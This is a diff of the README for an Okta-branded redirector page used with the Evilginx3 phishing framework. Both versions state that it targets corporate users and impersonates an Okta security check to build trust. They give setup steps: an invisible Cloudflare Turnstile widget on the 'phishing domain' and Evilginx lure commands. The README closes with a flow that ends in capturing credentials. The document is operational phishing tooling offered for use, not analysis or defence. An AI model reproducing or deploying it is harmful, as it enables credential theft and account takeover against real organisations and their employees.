@@ -1,42 +1,25 @@
 # Okta Turnstile Redirector
 
-## Overview
+Okta-branded Cloudflare Turnstile verification page for Evilginx3.
 
-Enterprise SSO security verification page with Okta branding for phishing campaigns targeting corporate environments.
+## Setup
 
-## Setup Instructions
+1. **Create Turnstile Site** in Cloudflare dashboard
+   - Domain: Your phishing domain
+   - Widget Mode: Invisible
+   - Copy Site Key
 
-### 1. Create Cloudflare Turnstile Site
+2. **Configure Redirector**
+   - Edit `index.html`
+   - Replace `'YOUR_TURNSTILE_SITE_KEY'` with your Site Key
 
-1. Go to https://dash.cloudflare.com/?to=/:account/turnstile
-2. Create new site with **Invisible** widget mode
-3. Copy the Site Key
+3. **Use with Lure**
+   ```bash
+   lures create okta
+   lures edit <id> redirector okta_turnstile
+   lures get-url <id>
+   ```
 
-### 2. Configure Redirector
+## How It Works
 
-Edit `index.html` line 160:
-```javascript
-const TURNSTILE_SITEKEY = 'YOUR_SITE_KEY';
-```
-
-### 3. Evilginx3 Configuration
-
-```
-lures create okta
-lures edit 0 redirector okta_turnstile
-lures edit 0 path /verify
-lures get-url 0
-```
-
-## Features
-
-- Professional Okta branding (#007DC1)
-- Enterprise security messaging
-- Clean, corporate design
-- Lock icon for trust indication
-- Fully responsive
-
-## Notes
-
-This redirector works with the generic Okta phishlet that supports any organization's Okta instance (*.okta.com wildcard). The enterprise-focused messaging helps build trust with corporate users.
-
+Lure URL → Okta verification → Turnstile check → Redirect to phishing page → Capture credentials
